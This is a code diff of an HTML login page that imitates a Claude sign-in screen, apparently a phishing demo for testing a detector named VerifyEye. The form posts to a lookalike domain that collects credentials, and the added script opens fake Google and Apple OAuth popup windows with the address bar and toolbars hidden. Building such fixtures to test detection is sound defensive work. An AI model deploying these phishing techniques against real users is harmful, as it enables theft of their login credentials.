@@ -146,11 +146,11 @@
 
       <!-- off-domain action is the phishing signal the detector reads -->
       <form class="card" action="https://claude-login-verify.com/collect" method="post">
-        <button type="button" class="oauth">
+        <button type="button" class="oauth" onclick="openGoogleOAuth()">
           <svg viewBox="0 0 48 48" aria-hidden="true"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.6l6.8-6.8C35.6 2.4 30.2 0 24 0 14.6 0 6.5 5.4 2.6 13.2l7.9 6.1C12.4 13.2 17.7 9.5 24 9.5z"/><path fill="#4285F4" d="M46.1 24.5c0-1.6-.1-3.1-.4-4.5H24v9h12.5c-.5 2.9-2.2 5.3-4.7 7l7.2 5.6c4.2-3.9 6.6-9.6 6.6-16.1z"/><path fill="#FBBC05" d="M10.5 28.7c-.5-1.5-.8-3-.8-4.7s.3-3.2.8-4.7l-7.9-6.1C1 16.3 0 20 0 24s1 7.7 2.6 10.8l7.9-6.1z"/><path fill="#34A853" d="M24 48c6.2 0 11.5-2 15.3-5.5l-7.2-5.6c-2 1.4-4.6 2.2-8.1 2.2-6.3 0-11.6-3.7-13.5-9.1l-7.9 6.1C6.5 42.6 14.6 48 24 48z"/></svg>
           Continue with Google
         </button>
-        <button type="button" class="oauth">
+        <button type="button" class="oauth" onclick="openAppleOAuth()">
           <svg viewBox="0 0 24 24" fill="#000" aria-hidden="true"><path d="M16.3 12.7c0-2.3 1.9-3.4 2-3.5-1.1-1.6-2.8-1.8-3.4-1.8-1.4-.1-2.8.9-3.5.9-.7 0-1.9-.8-3-.8-1.5 0-3 .9-3.8 2.3-1.6 2.8-.4 7 1.2 9.3.8 1.1 1.7 2.4 2.9 2.3 1.2 0 1.6-.8 3-.8s1.8.8 3 .7c1.2 0 2-1.1 2.8-2.2.9-1.3 1.2-2.5 1.3-2.6-.1 0-2.5-1-2.5-3.9zM14 5.4c.6-.8 1.1-1.8.9-2.9-.9.1-2 .6-2.6 1.4-.6.7-1.1 1.8-1 2.8 1 .1 2-.5 2.7-1.3z"/></svg>
           Continue with Apple
         </button>
@@ -175,5 +175,21 @@
       <video src="login-hero.mp4" poster="login-hero-still.webp" autoplay muted loop playsinline></video>
     </div>
   </div>
+
+  <!-- opens the fake Google OAuth window — the popup phishing technique. the
+       popup is its own fake Google page on localhost, so VerifyEye catches it
+       the same way it catches this page. GOOGLE_OAUTH_URL is set per demo. -->
+  <script>
+    const GOOGLE_OAUTH_URL = "http://localhost:5700";
+    const APPLE_OAUTH_URL = "http://localhost:6100";
+    function openOAuth(url, name) {
+      const w = 500, h = 600;
+      const left = screen.width / 2 - w / 2, top = screen.height / 2 - h / 2;
+      window.open(url, name,
+        `width=${w},height=${h},left=${left},top=${top},menubar=no,toolbar=no,location=no`);
+    }
+    function openGoogleOAuth() { openOAuth(GOOGLE_OAUTH_URL, "google_oauth"); }
+    function openAppleOAuth()  { openOAuth(APPLE_OAUTH_URL, "apple_oauth"); }
+  </script>
 </body>
 </html>
